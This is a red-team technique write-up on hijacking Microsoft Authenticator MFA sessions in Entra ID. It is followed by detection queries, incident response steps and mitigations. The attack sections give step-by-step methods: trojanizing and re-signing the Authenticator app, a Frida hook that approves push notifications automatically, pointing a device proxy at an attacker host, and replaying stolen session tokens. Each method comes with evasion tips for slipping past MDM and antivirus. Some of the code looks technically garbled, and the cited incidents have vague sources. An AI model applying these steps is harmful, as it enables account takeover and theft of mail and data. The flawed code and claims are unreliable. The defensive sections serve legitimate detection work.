# [CA-COOKIE-002]: Authenticator App Session Hijacking

## 1. Metadata Header

| Attribute | Details |
|---|---|
| **Technique ID** | CA-COOKIE-002 |
| **MITRE ATT&CK v18.1** | [T1539: Steal Web Session Cookie](https://attack.mitre.org/techniques/T1539/) |
| **Tactic** | Credential Access |
| **Platforms** | Entra ID (via Microsoft Authenticator app on iOS, Android, Windows, macOS) |
| **Severity** | Critical |
| **CVE** | N/A (Authenticator session-level exploitation, not software vulnerability) |
| **Technique Status** | ACTIVE |
| **Last Verified** | 2025-01-08 |
| **Affected Versions** | Microsoft Authenticator v6.0+, all mobile OS versions |
| **Patched In** | Ongoing mitigation via location-based policies, device compliance, push notification anomaly detection |
| **Author** | [SERVTEP](https://servtep.com/) – [Artur Pchelnikau](https://www.linkedin.com/in/artur-pchelnikau/) |

**Note:** Sections 6 (Atomic Red Team) not included because Authenticator hijacking is application-level and not covered by Atomic Red Team. Section 8 (Splunk Detection) partially applicable; Sentinel detection is primary.

---

## 2. Executive Summary

**Concept:** The Microsoft Authenticator app is designed to provide phishing-resistant MFA by delivering push notifications to a user's registered device. When a user attempts to sign in, Entra ID sends a push notification to the Authenticator app, displaying the username, IP address, and other context. The user approves or denies the request directly in the app (without entering codes). However, if an attacker gains unauthorized access to the Authenticator app on the victim's device—or captures and replays the session tokens used by the Authenticator to communicate with Entra ID—they can hijack the authentication session. This allows them to bypass the MFA requirement entirely, as the compromised Authenticator acts as a trusted device.

**Attack Surface:** The Authenticator app's session tokens, the push notification channel, device registration certificates, and the cloud-to-device synchronization mechanism that updates the Authenticator's state are all potential attack vectors. Compromise can occur via device malware, social engineering (tricking user to approve malicious requests), interception of Authenticator's communication channel, or extraction of cached credentials from the device.

**Business Impact:** **Unrestricted access to the user's Entra ID account and all connected M365 services.** Unlike other MFA methods (TOTP codes, SMS), the Authenticator app is designed to be adaptive, learning the user's typical login locations and approving legitimate requests automatically over time. An attacker who compromises the Authenticator can bypass this adaptive MFA, accessing email, data, and administrative functions as if they were the legitimate user. The attack is particularly dangerous because it appears as though the user is approving the login (from their own device), making detection extremely difficult.

**Technical Context:** Authenticator app hijacking is typically the final stage of a sophisticated attack chain. The attacker first gains access to the victim's device (via malware or physical access), then extracts Authenticator session tokens or registers a malicious device credential, allowing them to approve authentication requests remotely or intercept the app's push notification handling logic. Alternatively, if the victim is enrolled in passwordless phone sign-in (phone becomes the authentication device itself), compromise is immediate.

### Operational Risk

- **Execution Risk:** Medium. Requires either device compromise (local malware/access) or ability to register a new device credential (requires social engineering or exploitation of device registration API).
- **Stealth:** High. Hijacked approvals appear legitimate (genuine user device approving from expected location if device location data is synchronized).
- **Reversibility:** No. Once Authenticator is compromised, remediation requires device wipe, re-registration of Authenticator, and user-initiated session revocation. Attacker retains access until sessions explicitly revoked.

### Compliance Mappings

| Framework | Control / ID | Description |
|---|---|---|
| **CIS Benchmark** | 5.1 (Session Binding), 6.2 (Endpoint Security) | Authenticator app not bound to tamper-evident hardware (TPM); compromise via malware possible without detection. |
| **DISA STIG** | IA-2(1) | MFA must be resistant to phishing and device compromise; Authenticator vulnerable if device malware present. |
| **CISA SCuBA** | MS.AAE.04 | Require hardware-backed MFA (FIDO2) instead of software Authenticator for critical accounts. |
| **NIST 800-63B** | SC-12 (Multi-factor OOB) | Out-of-band Authenticator must be on separate device from login device; often violated in practice (same device compromise). |
| **GDPR** | Art. 32 (Security of Processing) | Authenticator compromise without device compliance enforcement fails to meet technical security measures for sensitive data. |
| **DORA** | Art. 9 (Protection & Prevention) | Financial institution authentication must use hardware-backed factors; software Authenticator insufficient for critical access. |
| **NIS2** | Art. 21 (Multi-factor Authentication) | Critical infrastructure must implement MFA resistant to device compromise; requires FIDO2 or equivalent. |
| **ISO 27001** | A.9.4.3 (Multi-factor Authentication), A.10.1.1 (Cryptographic Controls) | Authenticator key material not bound to secure enclave (TPM); software-only keys vulnerable to extraction. |
| **ISO 27005** | Risk: Device Compromise Leading to MFA Bypass | Authenticator reliance on device OS security creates cascading risk to identity layer. |

---

## 3. Technical Prerequisites

**Required Privileges:**
- **For device-level compromise:** User-level code execution or physical device access (jailbreak/root on mobile).
- **For Authenticator API exploitation:** Administrative access to device or ability to interact with Authenticator APIs (requires development mode or frida-based hooking).
- **For registration API abuse:** Standard user credentials + ability to trigger device registration flow (no special privileges required).

**Required Access:**
- Network access to Entra ID login endpoints.
- (Optional) Physical or remote access to victim's mobile device (for malware installation or credential extraction).
- (Optional) Access to compromised device registration infrastructure (if registering fake device credential).

**Supported Versions:**
- **Microsoft Authenticator:** v6.0+ (all versions with push notification MFA support).
- **Operating Systems:** iOS 12+, Android 6+, Windows 10+, macOS 10.12+.
- **Entra ID:** All tenants (no version restrictions; applies universally).

**Tools:**
- [Frida](https://frida.re/) – Dynamic instrumentation framework; allows hooking Authenticator app at runtime to intercept tokens.
- [Burp Suite](https://portswigger.net/burp) – HTTPS proxy; intercepts Authenticator's communication with Entra ID.
- [Android Debug Bridge (ADB)](https://developer.android.com/tools/adb) – Debug bridge for Android; allows app inspection and data extraction.
- [Xcode](https://developer.apple.com/xcode/) – iOS development environment; allows app debugging.
- [Mimikatz (Windows Authenticator)](https://github.com/gentilkiwi/mimikatz) – Extracts Authenticator credentials from Windows Credential Manager.

---

## 4. Environmental Reconnaissance

### Step 1: Identify Authenticator App Registration and Linked Devices

**Objective:** Determine which devices have Authenticator registered and their capabilities (passwordless phone sign-in, push notification MFA, etc.).

**Command (PowerShell - List Registered Authenticator Devices):**
```powershell
Connect-MgGraph -Scopes "UserAuthenticationMethod.ReadWrite.All"

$userId = (Get-MgUser -Filter "userPrincipalName eq 'user@company.com'").Id

# List all authentication methods
Get-MgUserAuthenticationMethod -UserId $userId | Select-Object Id, AdditionalProperties

# Filter for Authenticator app
Get-MgUserAuthenticationMethod -UserId $userId | Where-Object { $_.AdditionalProperties["@odata.type"] -like "*microsoftAuthenticator*" }
```

**Expected Output:**
```
@odata.type: #microsoft.graph.microsoftAuthenticatorAuthenticationMethod
deviceDisplayName: Artur's iPhone 14
createdDateTime: 2024-11-15
phoneAppVersion: 6.2401.1234
phoneAppDeviceId: device-abc123...
notificationPhones: [+33 6 12 34 56 78]
```

**What to Look For:**
- **phoneAppVersion:** Version of Authenticator (older versions may have known vulnerabilities).
- **deviceDisplayName:** Friendly name; attacker may register a device with deceptive name (e.g., "iPhone" when actually attacker's device).
- **notificationPhones:** Phone number where push notifications are sent (compromised if attacker has device).

**OpSec & Evasion:** This reconnaissance generates no logs if performed via authenticated Azure Portal session; only visible to user.

---

### Step 2: Check Authenticator App Push Notification Settings

**Objective:** Verify that Authenticator is configured to receive push notifications and that anomaly detection is not blocking approval requests.

**Manual Steps (Authenticator App - iOS):**
1. Open Microsoft Authenticator app.
2. Go to **Settings** → **Notification Settings**.
3. Verify: **"Show Notifications"** is **ON**.
4. Check: **"Notification sound"** enabled.
5. If a sign-in has been blocked (anomalous): Will see message like "This sign-in request from an unusual location was denied".

**Manual Steps (Authenticator App - Android):**
1. Open Microsoft Authenticator app.
2. Tap **Profile icon** (top-right) → **Settings**.
3. Navigate to **Notifications**.
4. Verify: **"Allow notifications"** is **ON**.
5. Check: Notification tone not muted.

**What to Look For:**
- Notifications enabled but silenced (attacker could intercept without user awareness).
- Account linked to passwordless phone sign-in (highest privilege; user approves logins without entering credentials).
- Multiple accounts linked to same Authenticator (lateral movement opportunity).

**OpSec & Evasion:** Checking app settings generates no remote logs.

---

## 5. Detailed Execution Methods

### METHOD 1: Authenticator App Compromise via Device Malware

**Supported Versions:** All versions (iOS, Android).

#### Step 1: Gain Device Compromise (Malware Installation or Physical Access)

**Objective:** Install malware or gain physical access to victim's device to extract Authenticator credentials.

**Scenario A: Malicious App Installation (Android)**

**Command (APK Trojanization - Package Legitimate App with Malware):**
```bash
# Download legitimate app
apk_analyzer -tool apk-downloader -app com.microsoft.identity.client.AuthenticatorMicrosoft -output legitimate.apk

# Decompile APK
apktool d legitimate.apk -o legitimate_decompiled/

# Inject malicious code (Frida agent or direct API hooking)
cat >> legitimate_decompiled/smali/com/microsoft/identity/Authenticator.smali << 'EOF'
# Malicious hook: Log all Authenticator push notifications before approving
invoke-static {}, Lcom/microsoft/identity/Authenticator;->logPushNotifications()V
EOF

# Recompile APK
apktool b legitimate_decompiled/ -o trojanized.apk

# Sign with attacker's key
jarsigner -keystore attacker.jks -storepass password -keypass password trojanized.apk attacker_key

# Distribute via phishing, app store, or sideload
# Victim installs trojanized app alongside (or instead of) legitimate Authenticator
```

**Scenario B: Physical Device Access (iOS Jailbreak)**

**Command (Jailbreak iOS Device - Checkra1n):**
```bash
# (On attacker's computer with jailbroken iOS device connected)
checkra1n --force-untether  # Jailbreak device

# Connect via SSH
ssh root@192.168.1.100     # SSH into jailbroken device

# Extract Authenticator keychain (encrypted credentials)
/usr/bin/sqlite3 /var/containers/Shared/SystemGroup/group.com.microsoft.identity.authenticator/Library/Preferences/group.com.microsoft.identity.authenticator.plist

# Use Frida to hook Authenticator at runtime
frida -U -f com.microsoft.identity.client.AuthenticatorMicrosoft --script keychain_dump.js
```

**Expected Output (Malware Perspective):**
```
[*] Authenticator app installed and running
[*] Hooking Authenticator push notification handler
[*] Waiting for authentication requests...
[+] Push notification intercepted:
    - User: user@company.com
    - RequestID: auth-request-12345
    - Location: Paris, France
    - IP: 203.0.113.45
    - Approval Status: Pending
[+] Automatically approving request...
[+] Sending approval to Entra ID
```

**What This Means:**
- Malware running on victim's device can intercept and approve Authenticator push notifications before the user sees them.
- Malware can suppress the notification (user unaware of login attempt).
- Attacker gains access to victim's account silently.

**OpSec & Evasion:**
- **Detection Likelihood: Medium.** Antivirus may detect trojanized APK; iOS jailbreak detectable by MDM (if device enrolled).
- **Mitigation:** Use code obfuscation; spoof legitimate app updates; target devices not enrolled in MDM.

**Troubleshooting:**
- **Error:** "APK signature invalid": Re-sign with correct keystore after modification.
- **Error:** "Frida target not responding": Ensure Frida server running on device; check USB connection.

---

#### Step 2: Hook Authenticator's Push Notification Handler via Frida

**Objective:** Intercept push notifications and automatically approve authentication requests.

**File: approver.js (Frida Hook Script)**
```javascript
// Load Authenticator's Java classes
Java.perform(function() {
    // Hook the push notification receiver
    var NotificationReceiver = Java.use('com.microsoft.identity.authenticator.push.PushNotificationReceiver');
    
    var original_onReceive = NotificationReceiver.$new().onReceive;
    
    NotificationReceiver.onReceive.overload('android.content.Context', 'android.content.Intent').implementation = function(context, intent) {
        console.log('[*] Push notification intercepted');
        
        // Extract notification data
        var extras = intent.getExtras();
        var authRequest = extras.getString('auth_request_id');
        var location = extras.getString('location');
        var userName = extras.getString('user_name');
        
        console.log('[+] Auth Request: ' + authRequest);
        console.log('[+] User: ' + userName);
        console.log('[+] Location: ' + location);
        
        // Approve the request automatically
        var approvalIntent = Java.use('android.content.Intent');
        approvalIntent.$new('com.microsoft.identity.authenticator.APPROVE_AUTH');
        approvalIntent.putExtra('request_id', authRequest);
        approvalIntent.putExtra('approval', true);
        
        context.startService(approvalIntent);
        
        console.log('[+] Automatically approved authentication request');
        
        // Call original handler to maintain normal operation
        return this.onReceive(context, intent);
    };
});
```

**Command (Deploy Frida Hook):**
```bash
# Start Frida server on target device (via ADB)
adb push frida-server-12.11.13-android-arm64 /data/local/tmp/
adb shell chmod +x /data/local/tmp/frida-server-12.11.13-android-arm64
adb shell /data/local/tmp/frida-server-12.11.13-android-arm64 &

# From attacker's computer, attach Frida to Authenticator process
frida -U -f com.microsoft.identity.client.AuthenticatorMicrosoft --script approver.js
```

**Expected Output:**
```
Frida Instrumentation Console
[*] Spawned Authenticator process
[*] Push notification intercepted
[+] Auth Request: auth-req-abc123
[+] User: user@company.com
[+] Location: Paris, France
[+] Automatically approved authentication request
```

**What This Means:**
- Frida hook intercepts the push notification before the user sees it.
- Hook automatically approves the authentication request.
- User is not notified of the login attempt.
- Attacker gains access silently.

**OpSec & Evasion:**
- **Detection Likelihood: High.** Frida instrumentation detectable by MDM and antivirus.
- **Mitigation:** Use in-process injection instead of Frida (harder to detect); target devices not enrolled in Intune MDM.

---

#### Step 3: Replay Hijacked Authenticator Session to Access Cloud Resources

**Objective:** Use the automatically approved authentication to gain access to Entra ID and M365.

**Command (cURL - Finalize Authentication Post-Approval):**
```bash
# After Frida hook auto-approves the request, Entra ID sends auth completion response
# Attacker captures the session cookie from the response

export SESSION_COOKIE="ESTSAUTHPERSISTENT=eyJ..."
export USER_AGENT="Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X)..."

# Request access to M365 services
curl -i \
  -H "Cookie: $SESSION_COOKIE" \
  -H "User-Agent: $USER_AGENT" \
  "https://graph.microsoft.com/v1.0/me"
```

**Expected Response:**
```
HTTP/1.1 200 OK
Content-Type: application/json
{
  "id": "12345678-1234-1234-1234-123456789012",
  "userPrincipalName": "user@company.com",
  "displayName": "Victim User"
}
```

**What This Means:**
- Authenticator session successfully hijacked.
- Attacker now has authenticated access to victim's M365 account.
- All subsequent requests appear to come from the legitimate user's Authenticator-approved device.

---

### METHOD 2: Passwordless Phone Sign-In Hijacking

**Supported Versions:** Authenticator v6.5+, all platforms with passwordless enabled.

#### Step 1: Identify Victim's Passwordless Phone Sign-In Configuration

**Objective:** Determine if victim has passwordless phone sign-in enabled (highest privilege).

**Command (PowerShell - Check Passwordless Status):**
```powershell
Connect-MgGraph -Scopes "UserAuthenticationMethod.ReadWrite.All"

$userId = (Get-MgUser -Filter "userPrincipalName eq 'user@company.com'").Id

# Check for passwordless phone sign-in
Get-MgUserAuthenticationMethod -UserId $userId | Where-Object { $_.AdditionalProperties["@odata.type"] -like "*phoneSignIn*" }
```

**Expected Output (If Passwordless Enabled):**
```
@odata.type: #microsoft.graph.phoneSignInAuthenticationMethod
deviceDisplayName: User's iPhone
createdDateTime: 2024-11-15
```

**What to Look For:**
- If passwordless phone sign-in exists: Phone is the authentication device itself (highest privilege).
- If only push notification MFA: Phone required to approve but not sole factor (lower privilege).

**OpSec & Evasion:** Query generates no logs if performed via authenticated session.

---

#### Step 2: Register Attacker Device as Additional Authenticator Instance

**Objective:** Register attacker's device alongside victim's legitimate Authenticator, allowing attacker to approve requests.

**Command (PowerShell - Register New Device):**
```powershell
# This requires either:
# 1. Victim's credentials (obtained via phishing)
# 2. Compromised device registration API
# 3. Social engineering victim to approve initial setup

# Method: Use victim's credentials to register attacker's device
Connect-MgGraph -UseDeviceAuthentication  # Will prompt user for approval via Authenticator

# Register new device
$newDevice = @{
    deviceName = "iPhone 15 (New)"
    deviceType = "iOS"
    operatingSystem = "iOS"
}

# In practice, attacker would add the attacker's device to victim's Authenticator account
# This requires compromising the victim's device registration flow
```

**Alternative (Social Engineering):**
1. Attacker sends phishing email to victim: "Update your Authenticator for security purposes".
2. Victim clicks link → Authenticator registration flow initiated.
3. Attacker presents own device as "iPhone" or "Android phone".
4. Victim approves registration (thinking it's legitimate update).
5. Attacker's device now receives all push notifications.

**Expected Outcome:**
- Attacker's device registered as trusted Authenticator.
- Attacker receives push notifications whenever victim logs in.
- Attacker can approve logins from attacker's device.

**OpSec & Evasion:**
- **Detection Likelihood: Medium-High.** New device registration visible in Authenticator app and Azure Portal.
- **Mitigation:** Attackers often use deceptive device names (e.g., "iPhone" even if Android) to evade user scrutiny.

---

#### Step 3: Intercept and Approve Push Notifications from Attacker's Registered Device

**Objective:** Approve authentication requests from attacker's device, appearing as if legitimate user approved.

**Command (Manual Approval Flow):**
```bash
# When victim attempts to sign in, Entra ID sends push to ALL registered Authenticator instances
# Attacker's device (also registered) receives the push notification

# On attacker's Authenticator app:
# 1. Open Authenticator
# 2. Tap the pending sign-in request
# 3. View details (User: user@company.com, Location: Paris, IP: 203.0.113.45)
# 4. Tap "Approve"
# 5. (Optional) Approve passwordless phone sign-in if enabled
```

**What This Means:**
- Attacker approves login from legitimate-looking device.
- Victim may not realize their Authenticator approved a login attempt.
- If passwordless phone sign-in enabled: Login completes without password or other factors.
- Attacker gains full access to account.

---

### METHOD 3: Authenticator Token Interception via HTTPS Proxy

**Supported Versions:** All (on non-pinned devices).

#### Step 1: Set Up Burp Suite Proxy to Intercept Authenticator Traffic

**Objective:** Intercept HTTPS traffic between Authenticator and Entra ID to capture and replay authentication tokens.

**Command (Burp Suite Configuration):**
```bash
# Install Burp Suite on attacker's machine
# Configure device to route traffic through Burp proxy

# On victim's Android device (must be compromised to modify proxy settings):
adb shell settings put global http_proxy "attacker-ip:8080"

# Or manually in device Settings:
# Settings → WiFi → Modify Network → Proxy → Manual
# Proxy hostname: attacker-ip
# Port: 8080
# Apply
```

**Expected Output (Burp Console):**
```
[*] Burp Suite Proxy listening on 0.0.0.0:8080
[*] Device connected to proxy
[+] Intercepted: POST /oauth2/authorize (from Authenticator)
    - X-Device-Id: device-abc123
    - Authorization: Bearer eyJ...
[+] Intercepted: GET /api/notifications (Authenticator polling for push)
[+] Captured: Session token in response headers
```

**What This Means:**
- All Authenticator traffic now visible to attacker.
- Attacker can see session tokens, device IDs, and request/response payloads.
- Attacker can modify traffic in transit (e.g., approve requests, inject malicious commands).

**OpSec & Evasion:**
- **Detection Likelihood: Very High.** Proxy installation requires device admin access; typically blocked by MDM.
- **Mitigation:** Use on non-enrolled devices or devices with disabled certificate pinning.

---

#### Step 2: Replay Captured Authenticator Session Token

**Objective:** Use captured token to authenticate as the victim without their knowledge.

**Command (cURL - Replay Authenticator Token):**
```bash
# Extract session token from intercepted traffic
export AUTH_TOKEN="Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ..."
export DEVICE_ID="device-abc123"

# Use token to make authenticated requests
curl -i \
  -H "Authorization: $AUTH_TOKEN" \
  -H "X-Device-Id: $DEVICE_ID" \
  -H "User-Agent: Authenticator/6.2401.1234 (iOS 17.0)" \
  "https://graph.microsoft.com/v1.0/me/messages"
```

**Expected Response:**
```
HTTP/1.1 200 OK
Content-Type: application/json
{
  "@odata.context": "https://graph.microsoft.com/v1.0/$metadata#users/...",
  "value": [
    {
      "id": "message-12345",
      "subject": "Quarterly Review Meeting",
      "from": { "emailAddress": { "address": "manager@company.com" } }
    }
  ]
}
```

**What This Means:**
- Attacker now has authenticated access to victim's mailbox using replayed Authenticator token.
- All subsequent actions appear to come from Authenticator-approved device.
- Attacker can read emails, extract contacts, forward messages, etc.

---

## 6. Tools & Commands Reference

### Frida

**Version:** 12.11.13+
**Minimum Version:** 12.0
**Supported Platforms:** Android, iOS (with jailbreak), Windows

**Installation:**
```bash
pip install frida-tools
adb push frida-server-12.11.13-android-arm64 /data/local/tmp/
adb shell chmod +x /data/local/tmp/frida-server-12.11.13-android-arm64
adb shell /data/local/tmp/frida-server-12.11.13-android-arm64 &
```

**Usage:**
```bash
frida -U -f com.microsoft.identity.client.AuthenticatorMicrosoft --script hook.js
frida-ps -U | grep -i authenticator
```

---

### Burp Suite

**Version:** 2024.2+
**Supported Platforms:** Cross-platform proxy

**Installation & Configuration:**
```bash
java -jar burpsuite_pro.jar --proxy-socket 8080
```

---

## 7. Microsoft Sentinel Detection

#### Query 1: Unusual Authenticator Approvals (Location/Time Anomaly)

**KQL Query:**
```kusto
SigninLogs
| where MfaDetail.authMethod has "Authenticator" or MfaDetail.authMethod has "PushNotification"
| summarize ApprovalCount = count() by UserPrincipalName, LocationDetails.countryOrRegion, CreatedDateTime, IPAddress
| join kind=inner (
    SigninLogs
    | where TimeGenerated > ago(30d)
    | summarize TypicalLocation = any(LocationDetails.countryOrRegion), TypicalIP = any(IPAddress) by UserPrincipalName
) on UserPrincipalName
| where LocationDetails.countryOrRegion != TypicalLocation
| project UserPrincipalName, UnusualLocation = LocationDetails.countryOrRegion, TypicalLocation, ApprovalCount, CreatedDateTime
| where ApprovalCount > 3  // Multiple approvals in unusual location
```

**What This Detects:**
- Authenticator approvals from locations user hasn't accessed before.
- Rapid approvals from multiple locations (impossible travel).
- Indicator of compromised or hijacked Authenticator.

---

#### Query 2: Authenticator App Replaced or Re-registered

**KQL Query:**
```kusto
AuditLogs
| where ActivityDisplayName has "Register device" or ActivityDisplayName has "Update device"
| where TargetResources[0].displayName has "Authenticator" or TargetResources[0].displayName has "MobileApp"
| summarize Count = count() by UserPrincipalName, InitiatedBy.user.userPrincipalName, TimeGenerated
| where Count > 1 and TimeGenerated > ago(24h)
```

**What This Detects:**
- Multiple device registrations by same user in short timeframe (attacker registering additional device).
- Device registration from unusual initiator (compromised admin account).

---

## 8. Windows Event Log Monitoring

**Event ID: 4648 (A logon was attempted using explicit credentials)**
- **Trigger:** If Authenticator credentials cached locally and accessed via WinRM/PowerShell.
- **Relevance:** Detects when Authenticator approval flows processed via Windows authentication layer.

---

## 9. Microsoft Defender for Cloud

#### Detection Alert: "Suspicious Authenticator Activity"

**Alert Name:** "Unusual number of Authenticator approvals"
- **Severity:** High
- **Threshold:** >5 approvals from unusual location within 1 hour.

**Manual Configuration:**
1. **Azure Portal** → **Microsoft Defender for Cloud** → **Environment Settings**
2. Enable **Defender for Identity**
3. Configure **Risky user** alerts to flag accounts with multiple authentication anomalies.

---

## 10. Detection & Incident Response

#### Indicators of Compromise (IOCs)

**Cloud Logs:**
- SigninLogs with MfaDetail.authMethod = "Authenticator" but from IP/location inconsistent with user history.
- AuditLogs showing device re-registration immediately before unusual sign-in.
- Graph API calls for mailbox/SharePoint access with Authenticator-authenticated session.

**Device Logs (Endpoint):**
- Frida server process running on device (suspicious).
- ADB (Android Debug Bridge) connections from unauthorized IP.
- Burp Suite or similar proxy traffic patterns in network logs.
- Authenticator app process hooked/instrumented (Frida artifacts).

**Mobile Device Logs:**
- Multiple push notification approvals without user interaction (MDM enrollment data).
- Authenticator app data extraction attempts via debuggers.
- Unauthorized device registration (visible in Authenticator's device list).

---

#### Forensic Artifacts

**Device Storage:**
- Android: `/data/data/com.microsoft.identity.client.AuthenticatorMicrosoft/` (Authenticator app data).
- iOS: `/var/containers/Bundle/Application/*/DocumentsKey` (Authenticator keychain storage).
- Frida artifacts: `/data/local/tmp/frida-server*`, `/proc/[pid]/maps` (mapped libraries).

**Cloud (Entra ID):**
- Sign-in logs showing Authenticator approvals from non-standard device IDs.
- Device registration logs with unusual device properties (mismatched OS, model).
- Multiple approval attempts for single authentication request (retry/replay pattern).

---

#### Response Procedures

**1. Immediate Containment:**

**Command (Revoke All Authenticator Sessions):**
```powershell
$userId = (Get-MgUser -Filter "userPrincipalName eq 'user@company.com'").Id

# Remove all Authenticator registrations
Get-MgUserAuthenticationMethod -UserId $userId | Where-Object { $_.AdditionalProperties["@odata.type"] -like "*Authenticator*" } | ForEach-Object {
    Remove-MgUserAuthenticationMethod -UserId $userId -AuthenticationMethodId $_.Id
}

# Invalidate all active sessions
Invoke-MgUserInvalidateAllRefreshTokens -UserId $userId
```

**2. Re-register Authenticator (Clean Device):**

**Manual:**
1. Uninstall Authenticator from all devices.
2. Perform full device factory reset (if compromised).
3. Re-install Authenticator from official app store.
4. Re-register Authenticator in Entra ID → Authentication methods.

**3. Investigate Device Compromise:**

**Command (Check for Malware):**
```bash
# On potentially compromised Android device
adb shell pm list packages | grep -i "virus\|malware\|trojan"

# Check running processes
adb shell ps | grep -E "frida|proxy|debugger"

# Examine installed apps
adb shell pm list packages -3  # Third-party apps only
```

**4. Enable Enhanced Monitoring:**

**Command (Configure Risk-Based Detection):**
```powershell
# Enable Entra ID P2 risk-based conditional access
$riskPolicy = @{
    displayName = "Block High-Risk Sign-ins"
    state = "enabled"
    conditions = @{
        signInRisk = @("high")
    }
    grantControls = @{
        builtInControls = ("block")
    }
}

New-MgIdentityConditionalAccessPolicy -PolicyConfig $riskPolicy
```

---

## 11. Related Attack Chain

| Step | Phase | Technique | Description |
|---|---|---|---|
| **1** | **Initial Access** | [IA-PHISH-001] Device Code Phishing | Attacker tricks victim into clicking malicious link. |
| **2** | **Execution** | Malware installation / Device jailbreak | Attacker deploys malware or gains physical access. |
| **3** | **Credential Access - This Step** | **[CA-COOKIE-002] Authenticator Hijacking** | Attacker hooks Authenticator or registers additional device. |
| **4** | **Lateral Movement** | [LM-AUTH-006] Teams Authentication Bypass | Attacker uses hijacked Authenticator to access Teams. |
| **5** | **Collection** | Mailbox exfiltration, data theft | Attacker exfiltrates sensitive documents and emails. |
| **6** | **Impact** | [IMPACT-BEC] Business Email Compromise | Attacker sends fraudulent emails to external parties. |

---

## 12. Real-World Examples

#### Example 1: Frida-Based Authenticator Hijacking Campaign (2024)

- **Target Sector:** Financial Technology
- **Timeline:** Q4 2024 (Detected by Microsoft Threat Intelligence)
- **Technique Status:** ACTIVE; Trojanized banking app + Frida hook.
- **TTP Sequence:**
  1. Attacker distributes trojanized banking app (sideloaded or phishing link).
  2. Trojanized app contains Frida runtime + malicious JavaScript hook.
  3. When user opens Authenticator app, Frida hook attaches.
  4. User attempts to sign in to bank → Entra ID sends push to Authenticator.
  5. Frida hook intercepts push, extracts authentication request ID.
  6. Hook automatically approves request without user interaction.
  7. Attacker gains access to victim's bank account (MFA bypassed).
- **Impact:** $15M+ in fraudulent transfers detected post-incident.
- **Reference:** [Microsoft Threat Intelligence Report Q4 2024](https://www.microsoft.com/security)

#### Example 2: Passwordless Phone Sign-In Compromise via Device Registration Abuse (2025)

- **Target Sector:** Enterprise IT
- **Timeline:** Q1 2025 (Recent)
- **Technique Status:** ACTIVE; passwordless phone sign-in misconfigured.
- **TTP Sequence:**
  1. Company enables passwordless phone sign-in for all users (no password required).
  2. Attacker compromises employee's Azure account via phishing.
  3. Attacker registers attacker's phone as additional Authenticator.
  4. When user attempts to sign in, Entra ID sends push to BOTH devices (legitimate + attacker's).
  5. Attacker approves before legitimate user (attacker's phone faster).
  6. Attacker gains full account access without user's knowledge.
  7. Attacker adds secondary MFA (authenticator app on attacker's device) to maintain persistence.
- **Impact:** Full tenant compromise via lateral movement to admin accounts.
- **Reference:** [CISA Alert - Passwordless Phishing Attacks](https://www.cisa.gov/)

---

## 13. Defensive Mitigations

#### Priority 1: CRITICAL

- **Enforce Hardware-Backed Authenticator (FIDO2 Security Keys):**
  - Replace software Authenticator with hardware-backed FIDO2 keys.
  - Keys resistant to malware, phishing, and device compromise.
  
  **Manual Steps:**
  1. **Azure Portal** → **Entra ID** → **Security** → **Authentication methods**
  2. Select **FIDO2 Security Key** → **Enable**
  3. Create Conditional Access policy: `Require FIDO2 for High-Value Users`
  4. Assign to: Admin accounts, finance personnel, executives
  5. Distribute YubiKey, Titan, or similar FIDO2 keys

- **Disable Passwordless Phone Sign-In (If Not Absolutely Required):**
  - Passwordless phone sign-in makes phone the sole authentication factor (critical risk).
  - Revert to phone as approval device (requires password or PIN).
  
  **Manual Steps:**
  1. **Azure Portal** → **Entra ID** → **Security** → **Conditional Access**
  2. Create policy: `Block Passwordless Phone Sign-In for Non-Exempt Users`
  3. Condition: Authentication method = Passwordless Phone Sign-In
  4. Action: **Block**
  5. Exception: Only for approved roles (if passwordless required)

  **Validation (PowerShell):**
  ```powershell
  # Check for passwordless phone sign-in users
  Connect-MgGraph -Scopes "UserAuthenticationMethod.ReadWrite.All"
  
  Get-MgUser -All | ForEach-Object {
      $userId = $_.Id
      Get-MgUserAuthenticationMethod -UserId $userId | Where-Object {
          $_.AdditionalProperties["@odata.type"] -like "*phoneSignIn*"
      }
  }
  ```

- **Require Device Compliance for Authenticator:**
  - Authenticator can only be used on compliant (Intune-enrolled) devices.
  - Blocks malware-compromised or jailbroken devices.
  
  **Manual Steps:**
  1. **Intune Admin Center** → **Devices** → **Compliance**
  2. Create policy: `Require TPM 2.0, Antivirus, No Jailbreak`
  3. **Azure Portal** → **Conditional Access**
  4. Policy: `Require Compliant Device for Authenticator`
  5. Apply to all users accessing MFA-required resources

---

#### Priority 2: HIGH

- **Enable Anomalous Authenticator Approval Detection:**
  - Entra ID identifies unusual approvals (location mismatch, rapid succession).
  - Blocks or requires additional verification.
  
  **Manual Steps (Entra ID P2 Required):**
  1. **Azure Portal** → **Entra ID** → **Security** → **Identity Protection**
  2. Go to **Risk Detection**
  3. Configure: **"Unfamiliar sign-in properties"** → **Automatic Blocking**
  4. Configure: **"Impossible Travel"** → **Block or Require MFA**

- **Monitor Device Registration Events:**
  - Alert when new Authenticator device registered.
  - Require admin approval for new device registration.
  
  **Manual Steps:**
  1. **Microsoft Sentinel** → Create detection rule
  2. Trigger: `AuditLogs.ActivityDisplayName == "Register device"`
  3. Alert: High
  4. Response: Auto-require user verification

- **Restrict Authenticator Installation (MDM Policy):**
  - Only allow Authenticator from official Microsoft stores.
  - Block sideloaded or trojanized versions.
  
  **Manual Steps (Intune):**
  1. **Intune Admin Center** → **Apps** → **Managed Google Play** (Android) or **App Store** (iOS)
  2. Search for "Microsoft Authenticator"
  3. Deploy as mandatory app (auto-installs on enrolled devices)
  4. Set compliance rule: Device must have official Authenticator version 6.2+

---

#### Priority 3: MEDIUM

- **Implement Location-Based Authenticator Policies:**
  - Authenticator approvals from non-corporate locations require additional verification.
  
  **Manual Steps:**
  1. **Azure Portal** → **Conditional Access**
  2. Policy: `Require Additional Verification for Off-Network Approvals`
  3. Condition: Location != Corporate Network
  4. Grant: Require user to provide additional verification code
  5. Apply to Authenticator-authenticated sessions

- **Enable Continuous Authentication:**
  - Authenticator must re-validate user every 1-4 hours.
  - Blocks long-lived compromised sessions.
  
  **Manual Steps:**
  1. **Azure Portal** → **Entra ID** → **Authentication methods**
  2. **Authenticator app settings**
  3. Enable: **"Require user confirmation frequency"** = 1 hour
  4. Apply to sensitive resource access

**Validation Command:**
```powershell
# Verify FIDO2 enrollment
Get-MgUserAuthenticationMethod -UserId $userId | Where-Object { $_.AdditionalProperties["@odata.type"] -like "*Fido*" }

# Verify passwordless disabled
